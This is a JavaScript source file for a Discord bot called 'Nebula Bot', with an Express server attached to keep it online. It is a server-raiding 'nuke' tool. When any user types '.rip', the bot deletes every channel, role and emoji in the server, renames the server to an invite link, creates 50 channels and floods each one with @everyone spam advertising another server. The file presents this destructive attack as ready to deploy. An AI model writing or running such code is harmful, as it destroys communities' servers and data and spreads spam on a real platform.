// ====== LIBRARIES ======
const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// Bot logic
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content === '.rip' && !message.author.bot) {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';

    // Delete all channels
    guild.channels.cache.forEach(async (channel) => {
      try {
        await channel.delete();
      } catch {}
    });

    await new Promise(r => setTimeout(r, 1000));

    // Delete all roles except @everyone
    guild.roles.cache.forEach(async (role) => {
      if (role.name !== '@everyone' && !role.managed) {
        try {
          await role.delete();
        } catch {}
      }
    });

    // Delete all emojis
    guild.emojis.cache.forEach(async (emoji) => {
      try {
        await emoji.delete();
      } catch {}
    });

    // Rename server
    try {
      await guild.edit({ name: 'discord.gg/migh' });
    } catch {}

    // Create 50 new channels
    let createdChannels = [];
    for (let i = 0; i < 50; i++) {
      try {
        const channel = await guild.channels.create({ name: 'neb-was-here' });
        createdChannels.push(channel);
      } catch {}
    }

    // Spam each with 20 messages
    createdChannels.forEach(async (channel) => {
      for (let i = 0; i < 20; i++) {
        try {
          await channel.send(spamMessage);
        } catch {}
      }
    });

    try {
      await message.channel.send('💥 Server nuked.');
    } catch {}
  }
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
